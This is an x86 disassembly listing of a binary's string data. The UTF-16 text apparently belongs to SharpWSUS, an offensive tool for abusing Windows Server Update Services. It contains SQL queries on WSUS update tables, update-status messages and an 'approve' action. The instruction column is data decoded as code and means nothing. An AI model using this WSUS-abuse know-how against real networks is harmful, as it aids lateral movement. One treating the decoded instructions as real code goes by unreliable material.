  40b74c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b74d:	00 20                	add    %ah,(%eax)
  40b74f:	00 61 00             	add    %ah,0x0(%ecx)
  40b752:	20 00                	and    %al,(%eax)
  40b754:	6c                   	insb   (%dx),%es:(%edi)
  40b755:	00 61 00             	add    %ah,0x0(%ecx)
  40b758:	62 00                	bound  %eax,(%eax)
  40b75a:	20 00                	and    %al,(%eax)
  40b75c:	61                   	popa
  40b75d:	00 6e 00             	add    %ch,0x0(%esi)
  40b760:	64 00 20             	add    %ah,%fs:(%eax)
  40b763:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40b767:	00 69 00             	add    %ch,0x0(%ecx)
  40b76a:	73 00                	jae    0x40b76c
  40b76c:	20 00                	and    %al,(%eax)
  40b76e:	74 00                	je     0x40b770
  40b770:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b776:	64 00 20             	add    %ah,%fs:(%eax)
  40b779:	00 6f 00             	add    %ch,0x0(%edi)
  40b77c:	75 00                	jne    0x40b77e
  40b77e:	74 00                	je     0x40b780
  40b780:	2c 00                	sub    $0x0,%al
  40b782:	20 00                	and    %al,(%eax)
  40b784:	74 00                	je     0x40b786
  40b786:	68 00 69 00 73       	push   $0x73006900
  40b78b:	00 20                	add    %ah,(%eax)
  40b78d:	00 63 00             	add    %ah,0x0(%ebx)
  40b790:	6f                   	outsl  %ds:(%esi),(%dx)
  40b791:	00 75 00             	add    %dh,0x0(%ebp)
  40b794:	6c                   	insb   (%dx),%es:(%edi)
  40b795:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40b799:	00 6f 00             	add    %ch,0x0(%edi)
  40b79c:	63 00                	arpl   %eax,(%eax)
  40b79e:	63 00                	arpl   %eax,(%eax)
  40b7a0:	75 00                	jne    0x40b7a2
  40b7a2:	72 00                	jb     0x40b7a4
  40b7a4:	20 00                	and    %al,(%eax)
  40b7a6:	69 00 66 00 20 00    	imul   $0x200066,(%eax),%eax
  40b7ac:	74 00                	je     0x40b7ae
  40b7ae:	68 00 65 00 72       	push   $0x72006500
  40b7b3:	00 65 00             	add    %ah,0x0(%ebp)
  40b7b6:	20 00                	and    %al,(%eax)
  40b7b8:	61                   	popa
  40b7b9:	00 72 00             	add    %dh,0x0(%edx)
  40b7bc:	65 00 20             	add    %ah,%gs:(%eax)
  40b7bf:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b7c3:	00 6f 00             	add    %ch,0x0(%edi)
  40b7c6:	20 00                	and    %al,(%eax)
  40b7c8:	6d                   	insl   (%dx),%es:(%edi)
  40b7c9:	00 61 00             	add    %ah,0x0(%ecx)
  40b7cc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7cd:	00 79 00             	add    %bh,0x0(%ecx)
  40b7d0:	20 00                	and    %al,(%eax)
  40b7d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7d3:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40b7d7:	00 20                	add    %ah,(%eax)
  40b7d9:	00 70 00             	add    %dh,0x0(%eax)
  40b7dc:	61                   	popa
  40b7dd:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40b7e1:	00 68 00             	add    %ch,0x0(%eax)
  40b7e4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7e8:	20 00                	and    %al,(%eax)
  40b7ea:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40b7f0:	74 00                	je     0x40b7f2
  40b7f2:	68 00 65 00 20       	push   $0x20006500
  40b7f7:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b7fb:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b7ff:	00 62 00             	add    %ah,0x0(%edx)
  40b802:	61                   	popa
  40b803:	00 73 00             	add    %dh,0x0(%ebx)
  40b806:	65 00 20             	add    %ah,%gs:(%eax)
  40b809:	00 63 00             	add    %ah,0x0(%ebx)
  40b80c:	61                   	popa
  40b80d:	00 75 00             	add    %dh,0x0(%ebp)
  40b810:	73 00                	jae    0x40b812
  40b812:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b818:	20 00                	and    %al,(%eax)
  40b81a:	70 00                	jo     0x40b81c
  40b81c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b820:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b824:	72 00                	jb     0x40b826
  40b826:	6d                   	insl   (%dx),%es:(%edi)
  40b827:	00 61 00             	add    %ah,0x0(%ecx)
  40b82a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b82b:	00 63 00             	add    %ah,0x0(%ebx)
  40b82e:	65 00 20             	add    %ah,%gs:(%eax)
  40b831:	00 69 00             	add    %ch,0x0(%ecx)
  40b834:	73 00                	jae    0x40b836
  40b836:	73 00                	jae    0x40b838
  40b838:	75 00                	jne    0x40b83a
  40b83a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b83e:	2e 00 00             	add    %al,%cs:(%eax)
  40b841:	73 53                	jae    0x40b896
  40b843:	00 45 00             	add    %al,0x0(%ebp)
  40b846:	4c                   	dec    %esp
  40b847:	00 45 00             	add    %al,0x0(%ebp)
  40b84a:	43                   	inc    %ebx
  40b84b:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b84f:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b853:	00 63 00             	add    %ah,0x0(%ebx)
  40b856:	61                   	popa
  40b857:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40b85b:	00 70 00             	add    %dh,0x0(%eax)
  40b85e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b862:	74 00                	je     0x40b864
  40b864:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b868:	44                   	inc    %esp
  40b869:	00 20                	add    %ah,(%eax)
  40b86b:	00 46 00             	add    %al,0x0(%esi)
  40b86e:	52                   	push   %edx
  40b86f:	00 4f 00             	add    %cl,0x0(%edi)
  40b872:	4d                   	dec    %ebp
  40b873:	00 20                	add    %ah,(%eax)
  40b875:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40b879:	00 6f 00             	add    %ch,0x0(%edi)
  40b87c:	2e 00 74 00 62       	add    %dh,%cs:0x62(%eax,%eax,1)
  40b881:	00 55 00             	add    %dl,0x0(%ebp)
  40b884:	70 00                	jo     0x40b886
  40b886:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b88a:	74 00                	je     0x40b88c
  40b88c:	65 00 20             	add    %ah,%gs:(%eax)
  40b88f:	00 57 00             	add    %dl,0x0(%edi)
  40b892:	48                   	dec    %eax
  40b893:	00 45 00             	add    %al,0x0(%ebp)
  40b896:	52                   	push   %edx
  40b897:	00 45 00             	add    %al,0x0(%ebp)
  40b89a:	20 00                	and    %al,(%eax)
  40b89c:	55                   	push   %ebp
  40b89d:	00 70 00             	add    %dh,0x0(%eax)
  40b8a0:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b8a4:	74 00                	je     0x40b8a6
  40b8a6:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b8aa:	44                   	inc    %esp
  40b8ab:	00 20                	add    %ah,(%eax)
  40b8ad:	00 3d 00 20 00 27    	add    %bh,0x27002000
  40b8b3:	00 01                	add    %al,(%ecx)
  40b8b5:	4b                   	dec    %ebx
  40b8b6:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40b8bb:	00 75 00             	add    %dh,0x0(%ebp)
  40b8be:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8bf:	00 63 00             	add    %ah,0x0(%ebx)
  40b8c2:	74 00                	je     0x40b8c4
  40b8c4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b8ca:	20 00                	and    %al,(%eax)
  40b8cc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8d0:	72 00                	jb     0x40b8d2
  40b8d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d3:	00 72 00             	add    %dh,0x0(%edx)
  40b8d6:	20 00                	and    %al,(%eax)
  40b8d8:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40b8dd:	00 62 00             	add    %ah,0x0(%edx)
  40b8e0:	47                   	inc    %edi
  40b8e1:	00 65 00             	add    %ah,0x0(%ebp)
  40b8e4:	74 00                	je     0x40b8e6
  40b8e6:	55                   	push   %ebp
  40b8e7:	00 70 00             	add    %dh,0x0(%eax)
  40b8ea:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b8ee:	74 00                	je     0x40b8f0
  40b8f0:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40b8f4:	74 00                	je     0x40b8f6
  40b8f6:	61                   	popa
  40b8f7:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40b8fb:	00 73 00             	add    %dh,0x0(%ebx)
  40b8fe:	2e 00 01             	add    %al,%cs:(%ecx)
  40b901:	1b 4c 00 6f          	sbb    0x6f(%eax,%eax,1),%ecx
  40b905:	00 63 00             	add    %ah,0x0(%ebx)
  40b908:	61                   	popa
  40b909:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40b90d:	00 70 00             	add    %dh,0x0(%eax)
  40b910:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b914:	74 00                	je     0x40b916
  40b916:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b91a:	44                   	inc    %esp
  40b91b:	00 00                	add    %al,(%eax)
  40b91d:	19 0d 00 0a 00 55    	sbb    %ecx,0x55000a00
  40b923:	00 70 00             	add    %dh,0x0(%eax)
  40b926:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b92a:	74 00                	je     0x40b92c
  40b92c:	65 00 20             	add    %ah,%gs:(%eax)
  40b92f:	00 49 00             	add    %cl,0x0(%ecx)
  40b932:	44                   	inc    %esp
  40b933:	00 20                	add    %ah,(%eax)
  40b935:	00 00                	add    %al,(%eax)
  40b937:	23 20                	and    (%eax),%esp
  40b939:	00 63 00             	add    %ah,0x0(%ebx)
  40b93c:	61                   	popa
  40b93d:	00 6e 00             	add    %ch,0x0(%esi)
  40b940:	6e                   	outsb  %ds:(%esi),(%dx)
  40b941:	00 6f 00             	add    %ch,0x0(%edi)
  40b944:	74 00                	je     0x40b946
  40b946:	20 00                	and    %al,(%eax)
  40b948:	62 00                	bound  %eax,(%eax)
  40b94a:	65 00 20             	add    %ah,%gs:(%eax)
  40b94d:	00 66 00             	add    %ah,0x0(%esi)
  40b950:	6f                   	outsl  %ds:(%esi),(%dx)
  40b951:	00 75 00             	add    %dh,0x0(%ebp)
  40b954:	6e                   	outsb  %ds:(%esi),(%dx)
  40b955:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b959:	00 00                	add    %al,(%eax)
  40b95b:	80 a5 53 00 45 00 4c 	andb   $0x4c,0x450053(%ebp)
  40b962:	00 45 00             	add    %al,0x0(%ebp)
  40b965:	43                   	inc    %ebx
  40b966:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b96a:	00 53 00             	add    %dl,0x0(%ebx)
  40b96d:	75 00                	jne    0x40b96f
  40b96f:	6d                   	insl   (%dx),%es:(%edi)
  40b970:	00 6d 00             	add    %ch,0x0(%ebp)
  40b973:	61                   	popa
  40b974:	00 72 00             	add    %dh,0x0(%edx)
  40b977:	69 00 7a 00 61 00    	imul   $0x61007a,(%eax),%eax
  40b97d:	74 00                	je     0x40b97f
  40b97f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b985:	53                   	push   %ebx
  40b986:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b98a:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b98e:	00 20                	add    %ah,(%eax)
  40b990:	00 46 00             	add    %al,0x0(%esi)
  40b993:	52                   	push   %edx
  40b994:	00 4f 00             	add    %cl,0x0(%edi)
  40b997:	4d                   	dec    %ebp
  40b998:	00 20                	add    %ah,(%eax)
  40b99a:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40b99e:	00 6f 00             	add    %ch,0x0(%edi)
  40b9a1:	2e 00 74 00 62       	add    %dh,%cs:0x62(%eax,%eax,1)
  40b9a6:	00 55 00             	add    %dl,0x0(%ebp)
  40b9a9:	70 00                	jo     0x40b9ab
  40b9ab:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b9af:	74 00                	je     0x40b9b1
  40b9b1:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40b9b5:	74 00                	je     0x40b9b7
  40b9b7:	61                   	popa
  40b9b8:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40b9bc:	00 73 00             	add    %dh,0x0(%ebx)
  40b9bf:	50                   	push   %eax
  40b9c0:	00 65 00             	add    %ah,0x0(%ebp)
  40b9c3:	72 00                	jb     0x40b9c5
  40b9c5:	43                   	inc    %ebx
  40b9c6:	00 6f 00             	add    %ch,0x0(%edi)
  40b9c9:	6d                   	insl   (%dx),%es:(%edi)
  40b9ca:	00 70 00             	add    %dh,0x0(%eax)
  40b9cd:	75 00                	jne    0x40b9cf
  40b9cf:	74 00                	je     0x40b9d1
  40b9d1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9d5:	20 00                	and    %al,(%eax)
  40b9d7:	57                   	push   %edi
  40b9d8:	00 48 00             	add    %cl,0x0(%eax)
  40b9db:	45                   	inc    %ebp
  40b9dc:	00 52 00             	add    %dl,0x0(%edx)
  40b9df:	45                   	inc    %ebp
  40b9e0:	00 20                	add    %ah,(%eax)
  40b9e2:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b9e6:	00 63 00             	add    %ah,0x0(%ebx)
  40b9e9:	61                   	popa
  40b9ea:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40b9ee:	00 70 00             	add    %dh,0x0(%eax)
  40b9f1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b9f5:	74 00                	je     0x40b9f7
  40b9f7:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b9fb:	44                   	inc    %esp
  40b9fc:	00 3d 00 27 00 01    	add    %bh,0x1002700
  40ba02:	21 27                	and    %esp,(%edi)
  40ba04:	00 20                	add    %ah,(%eax)
  40ba06:	00 41 00             	add    %al,0x0(%ecx)
  40ba09:	4e                   	dec    %esi
  40ba0a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40ba0e:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40ba12:	00 72 00             	add    %dh,0x0(%edx)
  40ba15:	67 00 65 00          	add    %ah,0x0(%di)
  40ba19:	74 00                	je     0x40ba1b
  40ba1b:	49                   	dec    %ecx
  40ba1c:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40ba20:	00 27                	add    %ah,(%edi)
  40ba22:	00 01                	add    %al,(%ecx)
  40ba24:	4d                   	dec    %ebp
  40ba25:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40ba2a:	00 75 00             	add    %dh,0x0(%ebp)
  40ba2d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba2e:	00 63 00             	add    %ah,0x0(%ebx)
  40ba31:	74 00                	je     0x40ba33
  40ba33:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba39:	20 00                	and    %al,(%eax)
  40ba3b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba3f:	72 00                	jb     0x40ba41
  40ba41:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba42:	00 72 00             	add    %dh,0x0(%edx)
  40ba45:	20 00                	and    %al,(%eax)
  40ba47:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40ba4c:	00 62 00             	add    %ah,0x0(%edx)
  40ba4f:	47                   	inc    %edi
  40ba50:	00 65 00             	add    %ah,0x0(%ebp)
  40ba53:	74 00                	je     0x40ba55
  40ba55:	55                   	push   %ebp
  40ba56:	00 70 00             	add    %dh,0x0(%eax)
  40ba59:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ba5d:	74 00                	je     0x40ba5f
  40ba5f:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40ba63:	74 00                	je     0x40ba65
  40ba65:	61                   	popa
  40ba66:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40ba6a:	00 73 00             	add    %dh,0x0(%ebx)
  40ba6d:	32 00                	xor    (%eax),%al
  40ba6f:	2e 00 01             	add    %al,%cs:(%ecx)
  40ba72:	25 53 00 75 00       	and    $0x750053,%eax
  40ba77:	6d                   	insl   (%dx),%es:(%edi)
  40ba78:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba7b:	61                   	popa
  40ba7c:	00 72 00             	add    %dh,0x0(%edx)
  40ba7f:	69 00 7a 00 61 00    	imul   $0x61007a,(%eax),%eax
  40ba85:	74 00                	je     0x40ba87
  40ba87:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba8d:	53                   	push   %ebx
  40ba8e:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40ba92:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ba96:	00 00                	add    %al,(%eax)
  40ba98:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  40ba9d:	5b                   	pop    %ebx
  40ba9e:	00 2a                	add    %ch,(%edx)
  40baa0:	00 5d 00             	add    %bl,0x0(%ebp)
  40baa3:	20 00                	and    %al,(%eax)
  40baa5:	55                   	push   %ebp
  40baa6:	00 70 00             	add    %dh,0x0(%eax)
  40baa9:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40baad:	74 00                	je     0x40baaf
  40baaf:	65 00 20             	add    %ah,%gs:(%eax)
  40bab2:	00 69 00             	add    %ch,0x0(%ecx)
  40bab5:	73 00                	jae    0x40bab7
  40bab7:	20 00                	and    %al,(%eax)
  40bab9:	6e                   	outsb  %ds:(%esi),(%dx)
  40baba:	00 6f 00             	add    %ch,0x0(%edi)
  40babd:	74 00                	je     0x40babf
  40babf:	20 00                	and    %al,(%eax)
  40bac1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bac2:	00 65 00             	add    %ah,0x0(%ebp)
  40bac5:	65 00 64 00 65       	add    %ah,%gs:0x65(%eax,%eax,1)
  40baca:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40bace:	3b 0d 00 0a 00 5b    	cmp    0x5b000a00,%ecx
  40bad4:	00 2a                	add    %ch,(%edx)
  40bad6:	00 5d 00             	add    %bl,0x0(%ebp)
  40bad9:	20 00                	and    %al,(%eax)
  40badb:	55                   	push   %ebp
  40badc:	00 70 00             	add    %dh,0x0(%eax)
  40badf:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bae3:	74 00                	je     0x40bae5
  40bae5:	65 00 20             	add    %ah,%gs:(%eax)
  40bae8:	00 69 00             	add    %ch,0x0(%ecx)
  40baeb:	73 00                	jae    0x40baed
  40baed:	20 00                	and    %al,(%eax)
  40baef:	6e                   	outsb  %ds:(%esi),(%dx)
  40baf0:	00 6f 00             	add    %ch,0x0(%edi)
  40baf3:	74 00                	je     0x40baf5
  40baf5:	20 00                	and    %al,(%eax)
  40baf7:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40bafd:	74 00                	je     0x40baff
  40baff:	61                   	popa
  40bb00:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb04:	00 65 00             	add    %ah,0x0(%ebp)
  40bb07:	64 00 00             	add    %al,%fs:(%eax)
  40bb0a:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  40bb0f:	5b                   	pop    %ebx
  40bb10:	00 2a                	add    %ch,(%edx)
  40bb12:	00 5d 00             	add    %bl,0x0(%ebp)
  40bb15:	20 00                	and    %al,(%eax)
  40bb17:	55                   	push   %ebp
  40bb18:	00 70 00             	add    %dh,0x0(%eax)
  40bb1b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bb1f:	74 00                	je     0x40bb21
  40bb21:	65 00 20             	add    %ah,%gs:(%eax)
  40bb24:	00 69 00             	add    %ch,0x0(%ecx)
  40bb27:	73 00                	jae    0x40bb29
  40bb29:	20 00                	and    %al,(%eax)
  40bb2b:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40bb2f:	77 00                	ja     0x40bb31
  40bb31:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb32:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40bb36:	00 61 00             	add    %ah,0x0(%ecx)
  40bb39:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40bb3d:	64 00 00             	add    %al,%fs:(%eax)
  40bb40:	33 0d 00 0a 00 5b    	xor    0x5b000a00,%ecx
  40bb46:	00 2a                	add    %ch,(%edx)
  40bb48:	00 5d 00             	add    %bl,0x0(%ebp)
  40bb4b:	20 00                	and    %al,(%eax)
  40bb4d:	55                   	push   %ebp
  40bb4e:	00 70 00             	add    %dh,0x0(%eax)
  40bb51:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bb55:	74 00                	je     0x40bb57
  40bb57:	65 00 20             	add    %ah,%gs:(%eax)
  40bb5a:	00 69 00             	add    %ch,0x0(%ecx)
  40bb5d:	73 00                	jae    0x40bb5f
  40bb5f:	20 00                	and    %al,(%eax)
  40bb61:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40bb67:	74 00                	je     0x40bb69
  40bb69:	61                   	popa
  40bb6a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb6e:	00 65 00             	add    %ah,0x0(%ebp)
  40bb71:	64 00 00             	add    %al,%fs:(%eax)
  40bb74:	27                   	daa
  40bb75:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40bb7a:	00 2a                	add    %ch,(%edx)
  40bb7c:	00 5d 00             	add    %bl,0x0(%ebp)
  40bb7f:	20 00                	and    %al,(%eax)
  40bb81:	55                   	push   %ebp
  40bb82:	00 70 00             	add    %dh,0x0(%eax)
  40bb85:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bb89:	74 00                	je     0x40bb8b
  40bb8b:	65 00 20             	add    %ah,%gs:(%eax)
  40bb8e:	00 66 00             	add    %ah,0x0(%esi)
  40bb91:	61                   	popa
  40bb92:	00 69 00             	add    %ch,0x0(%ecx)
  40bb95:	6c                   	insb   (%dx),%es:(%edi)
  40bb96:	00 65 00             	add    %ah,0x0(%ebp)
  40bb99:	64 00 00             	add    %al,%fs:(%eax)
  40bb9c:	2b 0d 00 0a 00 5b    	sub    0x5b000a00,%ecx
  40bba2:	00 2a                	add    %ch,(%edx)
  40bba4:	00 5d 00             	add    %bl,0x0(%ebp)
  40bba7:	20 00                	and    %al,(%eax)
  40bba9:	52                   	push   %edx
  40bbaa:	00 65 00             	add    %ah,0x0(%ebp)
  40bbad:	62 00                	bound  %eax,(%eax)
  40bbaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbb0:	00 6f 00             	add    %ch,0x0(%edi)
  40bbb3:	74 00                	je     0x40bbb5
  40bbb5:	20 00                	and    %al,(%eax)
  40bbb7:	52                   	push   %edx
  40bbb8:	00 65 00             	add    %ah,0x0(%ebp)
  40bbbb:	71 00                	jno    0x40bbbd
  40bbbd:	75 00                	jne    0x40bbbf
  40bbbf:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40bbc5:	64 00 00             	add    %al,%fs:(%eax)
  40bbc8:	61                   	popa
  40bbc9:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40bbce:	00 2a                	add    %ch,(%edx)
  40bbd0:	00 5d 00             	add    %bl,0x0(%ebp)
  40bbd3:	20 00                	and    %al,(%eax)
  40bbd5:	55                   	push   %ebp
  40bbd6:	00 70 00             	add    %dh,0x0(%eax)
  40bbd9:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bbdd:	74 00                	je     0x40bbdf
  40bbdf:	65 00 20             	add    %ah,%gs:(%eax)
  40bbe2:	00 49 00             	add    %cl,0x0(%ecx)
  40bbe5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbe6:	00 66 00             	add    %ah,0x0(%esi)
  40bbe9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbea:	00 20                	add    %ah,(%eax)
  40bbec:	00 77 00             	add    %dh,0x0(%edi)
  40bbef:	61                   	popa
  40bbf0:	00 73 00             	add    %dh,0x0(%ebx)
  40bbf3:	20 00                	and    %al,(%eax)
  40bbf5:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bbf9:	75 00                	jne    0x40bbfb
  40bbfb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbfc:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bc00:	00 62 00             	add    %ah,0x0(%edx)
  40bc03:	75 00                	jne    0x40bc05
  40bc05:	74 00                	je     0x40bc07
  40bc07:	20 00                	and    %al,(%eax)
  40bc09:	73 00                	jae    0x40bc0b
  40bc0b:	74 00                	je     0x40bc0d
  40bc0d:	61                   	popa
  40bc0e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bc12:	00 20                	add    %ah,(%eax)
  40bc14:	00 69 00             	add    %ch,0x0(%ecx)
  40bc17:	73 00                	jae    0x40bc19
  40bc19:	20 00                	and    %al,(%eax)
  40bc1b:	75 00                	jne    0x40bc1d
  40bc1d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc1e:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc21:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc22:	00 6f 00             	add    %ch,0x0(%edi)
  40bc25:	77 00                	ja     0x40bc27
  40bc27:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc28:	00 00                	add    %al,(%eax)
  40bc2a:	3d 0d 00 0a 00       	cmp    $0xa000d,%eax
  40bc2f:	55                   	push   %ebp
  40bc30:	00 70 00             	add    %dh,0x0(%eax)
  40bc33:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bc37:	74 00                	je     0x40bc39
  40bc39:	65 00 20             	add    %ah,%gs:(%eax)
  40bc3c:	00 49 00             	add    %cl,0x0(%ecx)
  40bc3f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc40:	00 66 00             	add    %ah,0x0(%esi)
  40bc43:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc44:	00 20                	add    %ah,(%eax)
  40bc46:	00 63 00             	add    %ah,0x0(%ebx)
  40bc49:	61                   	popa
  40bc4a:	00 6e 00             	add    %ch,0x0(%esi)
  40bc4d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc4e:	00 6f 00             	add    %ch,0x0(%edi)
  40bc51:	74 00                	je     0x40bc53
  40bc53:	20 00                	and    %al,(%eax)
  40bc55:	62 00                	bound  %eax,(%eax)
  40bc57:	65 00 20             	add    %ah,%gs:(%eax)
  40bc5a:	00 66 00             	add    %ah,0x0(%esi)
  40bc5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc5e:	00 75 00             	add    %dh,0x0(%ebp)
  40bc61:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc62:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40bc66:	00 00                	add    %al,(%eax)
  40bc68:	4d                   	dec    %ebp
  40bc69:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40bc6e:	00 21                	add    %ah,(%ecx)
  40bc70:	00 5d 00             	add    %bl,0x0(%ebp)
  40bc73:	20 00                	and    %al,(%eax)
  40bc75:	55                   	push   %ebp
  40bc76:	00 6e 00             	add    %ch,0x0(%esi)
  40bc79:	68 00 61 00 6e       	push   $0x6e006100
  40bc7e:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40bc82:	00 65 00             	add    %ah,0x0(%ebp)
  40bc85:	64 00 20             	add    %ah,%fs:(%eax)
  40bc88:	00 53 00             	add    %dl,0x0(%ebx)
  40bc8b:	68 00 61 00 72       	push   $0x72006100
  40bc90:	00 70 00             	add    %dh,0x0(%eax)
  40bc93:	57                   	push   %edi
  40bc94:	00 53 00             	add    %dl,0x0(%ebx)
  40bc97:	55                   	push   %ebp
  40bc98:	00 53 00             	add    %dl,0x0(%ebx)
  40bc9b:	20 00                	and    %al,(%eax)
  40bc9d:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bca1:	63 00                	arpl   %eax,(%eax)
  40bca3:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40bca7:	74 00                	je     0x40bca9
  40bca9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bcaf:	3a 00                	cmp    (%eax),%al
  40bcb1:	0d 00 0a 00 00       	or     $0xa00,%eax
  40bcb6:	01 00                	add    %eax,(%eax)
  40bcb8:	0f 61 00             	punpcklwd (%eax),%mm0
  40bcbb:	70 00                	jo     0x40bcbd
  40bcbd:	70 00                	jo     0x40bcbf
  40bcbf:	72 00                	jb     0x40bcc1
  40bcc1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcc2:	00 76 00             	add    %dh,0x0(%esi)
  40bcc5:	65 00 00             	add    %al,%gs:(%eax)
  40bcc8:	35 5b 00 2a 00       	xor    $0x2a005b,%eax
  40bccd:	5d                   	pop    %ebp
  40bcce:	00 20                	add    %ah,(%eax)
  40bcd0:	00 41 00             	add    %al,0x0(%ecx)
  40bcd3:	63 00                	arpl   %eax,(%eax)
  40bcd5:	74 00                	je     0x40bcd7
  40bcd7:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bcdd:	3a 00                	cmp    (%eax),%al
